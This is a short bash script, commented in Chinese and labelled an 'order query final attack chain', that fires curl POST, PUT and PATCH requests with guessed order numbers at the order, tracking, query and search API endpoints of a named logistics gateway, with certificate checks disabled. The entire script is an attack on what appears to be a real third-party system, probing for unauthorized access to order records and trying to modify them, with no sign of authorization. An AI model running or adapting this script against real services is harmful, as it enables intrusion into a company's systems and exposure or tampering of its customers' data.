#!/bin/bash
# 订单查询最终攻击 - 基于发现的端点

BASE="https://gw.vtpglobal.com.vn"

echo "[💥💥💥] 订单查询最终攻击链"
echo ""

# 1. 尝试不同的HTTP方法和body组合
echo "[+] POST to tms-receiving/api/v1/order..."
curl -sk "$BASE/tms-receiving/api/v1/order" -X POST \
  -H "Content-Type: application/json" \
  -d '{"orderNo":"VTP1000001"}' -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/tms-receiving/api/v1/order" -X POST \
  -H "Content-Type: application/json" \
  -d '{"id":"1000001"}' -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[+] POST to tms-receiving/api/v1/tracking..."
curl -sk "$BASE/tms-receiving/api/v1/tracking" -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"VTP1000001"}' -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[+] PUT to tms-receiving/api/v1/order..."
curl -sk "$BASE/tms-receiving/api/v1/order/1000001" -X PUT \
  -H "Content-Type: application/json" \
  -d '{}' -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[+] PATCH to tms-receiving/api/v1/order..."
curl -sk "$BASE/tms-receiving/api/v1/order/1000001" -X PATCH \
  -H "Content-Type: application/json" \
  -d '{}' -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[+] 测试query端点..."
curl -sk "$BASE/tms-receiving/api/v1/query" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"VTP1000001"}' -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/tms-receiving/api/v1/search" -X POST \
  -H "Content-Type: application/json" \
  -d '{"keyword":"VTP1000001"}' -w "\nHTTP: %{http_code}\n" | head -20
